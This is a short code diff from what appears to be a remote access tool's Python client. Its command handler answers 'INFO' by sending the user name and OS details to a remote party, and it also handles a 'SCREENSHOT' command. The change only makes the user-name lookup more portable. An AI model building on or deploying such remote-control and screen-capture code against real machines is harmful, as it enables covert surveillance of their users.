@@ -422,7 +422,7 @@ class Client(object):
                 continue
 
             if data[0] == 'INFO':
-                self.send('User: {}\nOS: {} {} ({})\n'.format(os.environ['USERNAME'], platform.system(), platform.release(), platform.platform()).encode())
+                self.send('User: {}\nOS: {} {} ({})\n'.format(getpass.getuser(), platform.system(), platform.release(), platform.platform()).encode())
                 continue
 
             if data[0] == 'SCREENSHOT':
